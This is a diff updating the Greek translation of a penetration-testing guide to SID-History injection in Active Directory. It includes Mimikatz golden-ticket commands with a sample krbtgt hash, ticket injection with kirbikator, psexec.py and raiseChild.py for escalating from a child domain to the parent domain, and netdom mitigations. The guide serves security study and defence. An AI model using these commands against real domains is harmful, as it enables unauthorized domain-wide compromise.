@@ -1,30 +1,30 @@
-# SID-History Injection
+# Έγχυση SID-History
 
 {{#include ../../banners/hacktricks-training.md}}
 
-## SID History Injection Attack
+## Επίθεση έγχυσης SID History
 
-Ο στόχος του **SID History Injection Attack** είναι να διευκολύνει τη **μετεγκατάσταση χρηστών μεταξύ domains**, διασφαλίζοντας παράλληλα τη συνεχιζόμενη πρόσβαση σε πόρους του προηγούμενου domain. Αυτό επιτυγχάνεται με την **ενσωμάτωση του προηγούμενου Security Identifier (SID) του χρήστη στο SID History** του νέου λογαριασμού του. Αξίζει να σημειωθεί ότι αυτή η διαδικασία μπορεί να χρησιμοποιηθεί καταχρηστικά για την παροχή μη εξουσιοδοτημένης πρόσβασης, προσθέτοντας το SID μιας ομάδας με υψηλά δικαιώματα (όπως οι Enterprise Admins ή οι Domain Admins) από το parent domain στο SID History. Αυτή η εκμετάλλευση παρέχει πρόσβαση σε όλους τους πόρους του parent domain.<sup>[[1]](#references)[[2]](#references)</sup>
+Ο στόχος της **επίθεσης έγχυσης SID History** είναι να διευκολύνει τη **μετεγκατάσταση χρηστών μεταξύ domains**, διασφαλίζοντας παράλληλα τη συνεχιζόμενη πρόσβαση σε πόρους του πρώην domain. Αυτό επιτυγχάνεται με την **ενσωμάτωση του προηγούμενου Security Identifier (SID) του χρήστη στο SID History** του νέου λογαριασμού του. Συγκεκριμένα, αυτή η διαδικασία μπορεί να χρησιμοποιηθεί καταχρηστικά για την παροχή μη εξουσιοδοτημένης πρόσβασης, προσθέτοντας το SID μιας ομάδας υψηλών προνομίων (όπως οι Enterprise Admins ή οι Domain Admins) από το parent domain στο SID History. Αυτή η εκμετάλλευση παρέχει πρόσβαση σε όλους τους πόρους εντός του parent domain.<sup>[[1]](#references)[[2]](#references)</sup>
 
-Υπάρχουν δύο μέθοδοι για την εκτέλεση αυτού του attack: μέσω της δημιουργίας είτε ενός **Golden Ticket** είτε ενός **Diamond Ticket**.
+Υπάρχουν δύο μέθοδοι για την εκτέλεση αυτής της επίθεσης: μέσω της δημιουργίας είτε ενός **Golden Ticket** είτε ενός **Diamond Ticket**.
 
-Για να εντοπίσετε το SID της ομάδας **"Enterprise Admins"**, πρέπει πρώτα να βρείτε το SID του root domain. Αφού εντοπιστεί, το SID της ομάδας Enterprise Admins μπορεί να κατασκευαστεί προσθέτοντας το `-519` στο SID του root domain. Για παράδειγμα, αν το SID του root domain είναι `S-1-5-21-280534878-1496970234-700767426`, το SID της ομάδας "Enterprise Admins" θα είναι `S-1-5-21-280534878-1496970234-700767426-519`.<sup>[[1]](#references)</sup>
+Για να εντοπίσετε το SID της ομάδας **"Enterprise Admins"**, πρέπει πρώτα να βρείτε το SID του root domain. Μετά τον εντοπισμό του, το SID της ομάδας Enterprise Admins μπορεί να κατασκευαστεί προσθέτοντας το `-519` στο SID του root domain. Για παράδειγμα, αν το SID του root domain είναι `S-1-5-21-280534878-1496970234-700767426`, το SID της ομάδας "Enterprise Admins" θα είναι `S-1-5-21-280534878-1496970234-700767426-519`.<sup>[[1]](#references)</sup>
 
 Μπορείτε επίσης να χρησιμοποιήσετε τις ομάδες **Domain Admins**, των οποίων το SID τελειώνει σε **512**.
 
-Ένας άλλος τρόπος για να βρείτε το SID μιας ομάδας του άλλου domain (για παράδειγμα, "Domain Admins") είναι ο εξής:
+Ένας άλλος τρόπος για να βρείτε το SID μιας ομάδας από το άλλο domain (για παράδειγμα, των "Domain Admins") είναι με:
 ```bash
 Get-DomainGroup -Identity "Domain Admins" -Domain parent.io -Properties ObjectSid
 ```
 > [!WARNING]
-> Σημειώστε ότι είναι δυνατή η απενεργοποίηση του SID history σε μια σχέση trust, γεγονός που θα κάνει αυτή την επίθεση να αποτύχει.
+> Σημειώστε ότι είναι δυνατή η απενεργοποίηση του SID history σε μια trust relationship, γεγονός που θα προκαλέσει αποτυχία αυτής της επίθεσης.
 
 Σύμφωνα με τα [**docs**](https://technet.microsoft.com/library/cc835085.aspx):<sup>[[3]](#references)</sup>
-- **Απενεργοποίηση του SIDHistory σε forest trusts** με χρήση του εργαλείου netdom (`netdom trust /domain: /EnableSIDHistory:no on the domain controller`)
-- **Εφαρμογή του SID Filter Quarantining σε external trusts** με χρήση του εργαλείου netdom (`netdom trust /domain: /quarantine:yes on the domain controller`)
-- **Η εφαρμογή του SID Filtering σε domain trusts εντός ενός single forest** δεν συνιστάται, καθώς πρόκειται για unsupported configuration και μπορεί να προκαλέσει breaking changes. Αν ένα domain μέσα σε ένα forest δεν είναι αξιόπιστο, δεν θα πρέπει να αποτελεί μέλος του forest. Σε αυτή την περίπτωση, είναι απαραίτητο να διαχωριστούν πρώτα τα trusted και untrusted domains σε ξεχωριστά forests, όπου μπορεί να εφαρμοστεί SID Filtering σε ένα interforest trust
+- **Απενεργοποίηση του SIDHistory σε forest trusts** με χρήση του netdom tool (`netdom trust /domain: /EnableSIDHistory:no on the domain controller`)
+- **Εφαρμογή του SID Filter Quarantining σε external trusts** με χρήση του netdom tool (`netdom trust /domain: /quarantine:yes on the domain controller`)
+- **Η εφαρμογή του SID Filtering σε domain trusts εντός ενός single forest** δεν συνιστάται, καθώς πρόκειται για unsupported configuration και μπορεί να προκαλέσει breaking changes. Αν ένα domain μέσα σε ένα forest δεν είναι αξιόπιστο, τότε δεν θα πρέπει να αποτελεί μέλος του forest. Σε αυτήν την περίπτωση, είναι απαραίτητο να διαχωριστούν πρώτα τα trusted και untrusted domains σε ξεχωριστά forests, ώστε να μπορεί να εφαρμοστεί SID Filtering σε ένα interforest trust
 
-Δείτε αυτό το post για περισσότερες πληροφορίες σχετικά με το bypassing: [**https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-4**](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-4)
+Δείτε αυτό το post για περισσότερες πληροφορίες σχετικά με το bypassing: [**https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-4**](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-4)<sup>[[4]](#references)</sup>
 
 ### Diamond Ticket (Rubeus + KRBTGT-AES256)
 
@@ -80,7 +80,7 @@ diamond-ticket.md
 .\kirbikator.exe lsa .\CIFS.mcorpdc.moneycorp.local.kirbi
 ls \\mcorp-dc.moneycorp.local\c$
 ```
-Κάντε escalate σε DA του root ή Enterprise admin χρησιμοποιώντας το KRBTGT hash του παραβιασμένου domain:
+Κάντε privilege escalation σε DA του root ή Enterprise admin χρησιμοποιώντας το KRBTGT hash του compromised domain:
 ```bash
 Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-211874506631-3219952063-538504511 /sids:S-1-5-21-280534878-1496970234700767426-519 /krbtgt:ff46a9d8bd66c6efd77603da26796f35 /ticket:C:\AD\Tools\krbtgt_tkt.kirbi"'
 
@@ -123,7 +123,7 @@ psexec.py <child_domain>/Administrator@dc.root.local -k -no-pass -target-ip 10.1
 ```
 #### Αυτόματα με χρήση του [raiseChild.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/raiseChild.py)
 
-Αυτό είναι ένα script του Impacket που θα **αυτοματοποιήσει την κλιμάκωση από child σε parent domain**. Το script χρειάζεται:
+Πρόκειται για ένα script του Impacket που θα **αυτοματοποιήσει την κλιμάκωση από το child domain στο parent domain**. Το script χρειάζεται:
 
 - Domain controller-στόχο
 - Creds για έναν admin user στο child domain
@@ -131,18 +131,19 @@ psexec.py <child_domain>/Administrator@dc.root.local -k -no-pass -target-ip 10.1
 Η ροή είναι:
 
 - Λαμβάνει το SID του group Enterprise Admins του parent domain
-- Ανακτά το hash για το account KRBTGT στο child domain
+- Ανακτά το hash για τον λογαριασμό KRBTGT στο child domain
 - Δημιουργεί ένα Golden Ticket
-- Κάνει login στο parent domain
-- Ανακτά τα credentials για το account Administrator στο parent domain
-- Αν έχει οριστεί το switch `target-exec`, πραγματοποιεί authentication στον Domain Controller του parent domain μέσω Psexec.
+- Συνδέεται στο parent domain
+- Ανακτά τα credentials για τον λογαριασμό Administrator στο parent domain
+- Αν έχει καθοριστεί το switch `target-exec`, πραγματοποιεί authentication στον Domain Controller του parent domain μέσω Psexec.
 ```bash
 raiseChild.py -target-exec 10.10.10.10 <child_domain>/username
 ```
 ## Αναφορές
 
 - [1] [Sneaky Active Directory Persistence #14: SID History - adsecurity.org](https://adsecurity.org/?p=1772)
-- [2] [What is Security Identifier (SID)? - SentinelOne](https://www.sentinelone.com/blog/windows-sid-history-injection-exposure-blog/)
-- [3] [Security Considerations for Trusts - Microsoft TechNet](https://technet.microsoft.com/library/cc835085.aspx)
+- [2] [Τι είναι το Security Identifier (SID); - SentinelOne](https://www.sentinelone.com/blog/windows-sid-history-injection-exposure-blog/)
+- [3] [Ζητήματα ασφαλείας για τα Trusts - Microsoft TechNet](https://technet.microsoft.com/library/cc835085.aspx)
+- [4] [itm8.com - Το Sid Filter ως όριο ασφαλείας μεταξύ domains, Μέρος 4](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-4)
 
 {{#include ../../banners/hacktricks-training.md}}
